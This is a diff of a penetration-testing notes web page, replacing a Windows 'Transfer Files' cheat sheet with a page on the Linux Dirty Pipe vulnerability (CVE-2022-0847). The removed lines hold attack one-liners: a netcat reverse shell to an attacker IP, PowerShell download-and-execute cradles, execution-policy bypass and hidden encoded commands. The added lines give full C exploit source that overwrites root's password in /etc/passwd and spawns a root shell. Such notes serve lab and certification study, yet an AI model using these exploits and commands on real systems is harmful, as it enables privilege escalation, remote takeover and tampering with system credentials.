@@ -6,18 +6,21 @@
     <meta name="turbo-cache-control" content="no-cache">
 
     <!-- Primary Meta Tags -->
-    <title>Transfer Files</title>
-    <meta name="title" content="Transfer Files">
+    <title>Dirty Pipe</title>
+    <meta name="title" content="Dirty Pipe">
+    <meta name="description" content="Linux kernel versions newer than 5.8 are affected. So far the vulnerability has been patched in the following Linux kernel versions:" />
 
     <!-- Open Graph / Facebook -->
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://caueb.github.io/windowstricks/transfer-f-c525a/">
-    <meta property="og:title" content="Transfer Files">
+    <meta property="og:url" content="https://caueb.github.io/linuxprivesc/dirtypipe/">
+    <meta property="og:title" content="Dirty Pipe">
+    <meta property="og:description" content="Linux kernel versions newer than 5.8 are affected. So far the vulnerability has been patched in the following Linux kernel versions:">
 
     <!-- Twitter -->
     <meta property="twitter:card" content="summary_large_image">
-    <meta property="twitter:url" content="https://caueb.github.io/windowstricks/transfer-f-c525a/">
-    <meta property="twitter:title" content="Transfer Files">
+    <meta property="twitter:url" content="https://caueb.github.io/linuxprivesc/dirtypipe/">
+    <meta property="twitter:title" content="Dirty Pipe">
+    <meta property="twitter:description" content="Linux kernel versions newer than 5.8 are affected. So far the vulnerability has been patched in the following Linux kernel versions:">
     
     <script>(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
 
@@ -181,63 +184,232 @@
                 <div id="docs-sidebar-right-toggle"></div>
                
                 <!-- Page content  -->
-<doc-anchor-target id="transfer-files" class="break-words">
+<doc-anchor-target id="dirty-pipe" class="break-words">
     <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#transfer-files">#</doc-anchor-trigger>
-        <span>Transfer Files</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#dirty-pipe">#</doc-anchor-trigger>
+        <span>Dirty Pipe</span>
     </h1>
 </doc-anchor-target>
-<doc-anchor-target id="smb-share">
+<doc-anchor-target id="affected-versions">
     <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#smb-share">#</doc-anchor-trigger>
-        <span>SMB Share</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#affected-versions">#</doc-anchor-trigger>
+        <span>Affected versions</span>
+    </h2>
+</doc-anchor-target>
+<p>Linux kernel versions newer than 5.8 are affected.<br />
+So far the vulnerability has been patched in the following Linux kernel versions:</p>
+<ul>
+<li>5.16.11</li>
+<li>5.15.25</li>
+<li>5.10.102</li>
+</ul>
+<doc-anchor-target id="exploit-repositories">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#exploit-repositories">#</doc-anchor-trigger>
+        <span>Exploit Repositories</span>
     </h2>
 </doc-anchor-target>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash"># Start SMB Share
-sudo python3 smbserver.py -smb2support [my share name] [directory to share]
-
-# Copy files from the share
-Copy-Item -Path \\10.10.14.22\share\winpeas.exe -Destination C:\windows\temp\ -Force
-
-# Windows can execute files in Kali SHARE
-Example of kernel exploit below 
-\\10.10.14.22\share\ms15-051x64.exe &quot;\\10.10.14.22\share\nc64.exe -e cmd.exe 10.10.14.22 443&quot;</code></pre>
+<pre class="language-none"><code v-pre class="language-none">https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits</code></pre>
 </doc-codeblock></div>
-<doc-anchor-target id="powershell">
+<doc-anchor-target id="exploit">
     <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#powershell">#</doc-anchor-trigger>
-        <span>Powershell</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#exploit">#</doc-anchor-trigger>
+        <span>Exploit</span>
     </h2>
 </doc-anchor-target>
+<p>Compile using <code v-pre>gcc exploit.c -o exploit</code>. It will overwrite the root password to <code v-pre>aaron</code> and sapwn a shell.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-powershell"><code v-pre class="language-powershell"># Download File
-certutil.exe -urlcache -split -f http://10.10.14.10:8000/nc64.exe C:\\Users\\Public\\nc64.exe
-IWR -uri http://192.168.49.134/evil.exe -outfile C:\backup\evil.exe
+<div class="codeblock-title">exploit.c</div>
+<pre class="language-c"><code v-pre class="language-c">/* SPDX-License-Identifier: GPL-2.0 */
+/*
+ * Copyright 2022 CM4all GmbH / IONOS SE
+ *
+ * author: Max Kellermann &lt;max.kellermann@ionos.com&gt;
+ *
+ * Proof-of-concept exploit for the Dirty Pipe
+ * vulnerability (CVE-2022-0847) caused by an uninitialized
+ * &quot;pipe_buffer.flags&quot; variable.  It demonstrates how to overwrite any
+ * file contents in the page cache, even if the file is not permitted
+ * to be written, immutable or on a read-only mount.
+ *
+ * This exploit requires Linux 5.8 or later; the code path was made
+ * reachable by commit f6dd975583bd (&quot;pipe: merge
+ * anon_pipe_buf*_ops&quot;).  The commit did not introduce the bug, it was
+ * there before, it just provided an easy way to exploit it.
+ *
+ * There are two major limitations of this exploit: the offset cannot
+ * be on a page boundary (it needs to write one byte before the offset
+ * to add a reference to this page to the pipe), and the write cannot
+ * cross a page boundary.
+ *
+ * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
+ *
+ * Further explanation: https://dirtypipe.cm4all.com/
+ */
 
-# Download and run reverse shell
-powershell &quot;IEX(New-Object Net.WebClient).downloadString('http://10.10.14.20:80/shell.ps1')&quot;
-(new-object net.webclient).downloadfile('http://10.10.14.22:80/JuicyPotato.exe', 'C:\Windows\Temp\JuicyPotato.exe')
-powershell -c iwr -uri http://10.10.14.13:80/winpeas.exe -o c:\users\blake\downloads\wp.exe
+#define _GNU_SOURCE
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;sys/user.h&gt;
 
-# Bypass policy
-powershell -exec bypass -c &quot;(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.10.14.20/shell.ps1')|iex&quot;
+#ifndef PAGE_SIZE
+#define PAGE_SIZE 4096
+#endif
 
-powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString('http://10.13.14.7/script.ps1')
+/**
+ * Create a pipe where all &quot;bufs&quot; on the pipe_inode_info ring have the
+ * PIPE_BUF_FLAG_CAN_MERGE flag set.
+ */
+static void prepare_pipe(int p[2])
+{
+	if (pipe(p)) abort();
 
-powershell -W Hidden -nop -noni -enc &lt;base64 text&gt;</code></pre>
+	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
+	static char buffer[4096];
+
+	/* fill the pipe completely; each pipe_buffer will now have
+	   the PIPE_BUF_FLAG_CAN_MERGE flag */
+	for (unsigned r = pipe_size; r &gt; 0;) {
+		unsigned n = r &gt; sizeof(buffer) ? sizeof(buffer) : r;
+		write(p[1], buffer, n);
+		r -= n;
+	}
+
+	/* drain the pipe, freeing all pipe_buffer instances (but
+	   leaving the flags initialized) */
+	for (unsigned r = pipe_size; r &gt; 0;) {
+		unsigned n = r &gt; sizeof(buffer) ? sizeof(buffer) : r;
+		read(p[0], buffer, n);
+		r -= n;
+	}
+
+	/* the pipe is now empty, and if somebody adds a new
+	   pipe_buffer without initializing its &quot;flags&quot;, the buffer
+	   will be mergeable */
+}
+
+int main() {
+	const char *const path = &quot;/etc/passwd&quot;;
+
+        printf(&quot;Backing up /etc/passwd to /tmp/passwd.bak ...\n&quot;);
+        FILE *f1 = fopen(&quot;/etc/passwd&quot;, &quot;r&quot;);
+        FILE *f2 = fopen(&quot;/tmp/passwd.bak&quot;, &quot;w&quot;);
+
+        if (f1 == NULL) {
+            printf(&quot;Failed to open /etc/passwd\n&quot;);
+            exit(EXIT_FAILURE);
+        } else if (f2 == NULL) {
+            printf(&quot;Failed to open /tmp/passwd.bak\n&quot;);
+            fclose(f1);
+            exit(EXIT_FAILURE);
+        }
+
+        char c;
+        while ((c = fgetc(f1)) != EOF)
+            fputc(c, f2);
+
+        fclose(f1);
+        fclose(f2);
+
+	loff_t offset = 4; // after the &quot;root&quot;
+	const char *const data = &quot;:$1$aaron$pIwpJwMMcozsUxAtRa85w.:0:0:test:/root:/bin/sh\n&quot;; // openssl passwd -1 -salt aaron aaron 
+        printf(&quot;Setting root password to \&quot;aaron\&quot;...\n&quot;);
+	const size_t data_size = strlen(data);
+
+	if (offset % PAGE_SIZE == 0) {
+		fprintf(stderr, &quot;Sorry, cannot start writing at a page boundary\n&quot;);
+		return EXIT_FAILURE;
+	}
+
+	const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
+	const loff_t end_offset = offset + (loff_t)data_size;
+	if (end_offset &gt; next_page) {
+		fprintf(stderr, &quot;Sorry, cannot write across a page boundary\n&quot;);
+		return EXIT_FAILURE;
+	}
+
+	/* open the input file and validate the specified offset */
+	const int fd = open(path, O_RDONLY); // yes, read-only! :-)
+	if (fd &lt; 0) {
+		perror(&quot;open failed&quot;);
+		return EXIT_FAILURE;
+	}
+
+	struct stat st;
+	if (fstat(fd, &amp;st)) {
+		perror(&quot;stat failed&quot;);
+		return EXIT_FAILURE;
+	}
+
+	if (offset &gt; st.st_size) {
+		fprintf(stderr, &quot;Offset is not inside the file\n&quot;);
+		return EXIT_FAILURE;
+	}
+
+	if (end_offset &gt; st.st_size) {
+		fprintf(stderr, &quot;Sorry, cannot enlarge the file\n&quot;);
+		return EXIT_FAILURE;
+	}
+
+	/* create the pipe with all flags initialized with
+	   PIPE_BUF_FLAG_CAN_MERGE */
+	int p[2];
+	prepare_pipe(p);
+
+	/* splice one byte from before the specified offset into the
+	   pipe; this will add a reference to the page cache, but
+	   since copy_page_to_iter_pipe() does not initialize the
+	   &quot;flags&quot;, PIPE_BUF_FLAG_CAN_MERGE is still set */
+	--offset;
+	ssize_t nbytes = splice(fd, &amp;offset, p[1], NULL, 1, 0);
+	if (nbytes &lt; 0) {
+		perror(&quot;splice failed&quot;);
+		return EXIT_FAILURE;
+	}
+	if (nbytes == 0) {
+		fprintf(stderr, &quot;short splice\n&quot;);
+		return EXIT_FAILURE;
+	}
+
+	/* the following write will not create a new pipe_buffer, but
+	   will instead write into the page cache, because of the
+	   PIPE_BUF_FLAG_CAN_MERGE flag */
+	nbytes = write(p[1], data, data_size);
+	if (nbytes &lt; 0) {
+		perror(&quot;write failed&quot;);
+		return EXIT_FAILURE;
+	}
+	if ((size_t)nbytes &lt; data_size) {
+		fprintf(stderr, &quot;short write\n&quot;);
+		return EXIT_FAILURE;
+	}
+
+	char *argv[] = {&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;(echo aaron; cat) | su - -c \&quot;&quot;
+                &quot;echo \\\&quot;Restoring /etc/passwd from /tmp/passwd.bak...\\\&quot;;&quot;
+                &quot;cp /tmp/passwd.bak /etc/passwd;&quot;
+                &quot;echo \\\&quot;Done! Popping shell... (run commands now)\\\&quot;;&quot;
+                &quot;/bin/sh;&quot;
+            &quot;\&quot; root&quot;};
+        execv(&quot;/bin/sh&quot;, argv);
+
+        printf(&quot;system() function call seems to have failed :(\n&quot;);
+	return EXIT_SUCCESS;
+}</code></pre>
 </doc-codeblock></div>
-<doc-anchor-target id="base64-encoded-file">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#base64-encoded-file">#</doc-anchor-trigger>
-        <span>Base64 encoded file</span>
-    </h2>
+<doc-anchor-target id="su-must-be-run-from-a-terminal">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#su-must-be-run-from-a-terminal">#</doc-anchor-trigger>
+        <span>su: must be run from a terminal</span>
+    </h3>
 </doc-anchor-target>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-powershell"><code v-pre class="language-powershell">echo &quot;IEX(New-Object Net.WebClient).downloadString('http://10.13.14.7/shell.ps1')&quot; |iconv -t UTF-16LE | base64 -w 0
-
-powershell -nop -enc ASDKnxADadaSDASDikA</code></pre>
-</doc-codeblock></div>
+<p>If you get this error message:
+1 - Login as root with the password aaron.
+2 - Then, restore /etc/passwd by running mv /tmp/passwd.bak /etc/passwd</p>
 
 
 
@@ -249,20 +421,20 @@ powershell -nop -enc ASDKnxADadaSDASDikA</code></pre>
             
 <nav class="flex mt-14">
     <div class="w-1/2">
-        <a class="px-5 py-4 h-full flex items-center break-all md:break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="/windowstricks/post-explo-3830d/">
+        <a class="px-5 py-4 h-full flex items-center break-all md:break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="/linuxprivesc/cronjobsdc94e/">
             <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
             <span>
                 <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
-                <span class="block mt-1">Post Exploitation</span>
+                <span class="block mt-1">Cronjobs</span>
             </span>
         </a>
     </div>
 
     <div class="w-1/2">
-        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-all md:break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="/writeups/oswe-prep/homeless/">
+        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-all md:break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="/linuxprivesc/kernelexp14b2d/">
             <span>
                 <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
-                <span class="block mt-1">Homeless</span>
+                <span class="block mt-1">Kernel Exploit</span>
             </span>
             <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
         </a>
@@ -310,6 +482,6 @@ powershell -nop -enc ASDKnxADadaSDASDikA</code></pre>
 
         <div id="docs-overlay-target"></div>
 
-        <script>window.__DOCS__ = { "title": "Transfer Files", icon: "file", hasPrism: true, hasMermaid: false, hasMath: false }</script>
+        <script>window.__DOCS__ = { "title": "Dirty Pipe", icon: "file", hasPrism: true, hasMermaid: false, hasMath: false }</script>
     </body>
 </html>
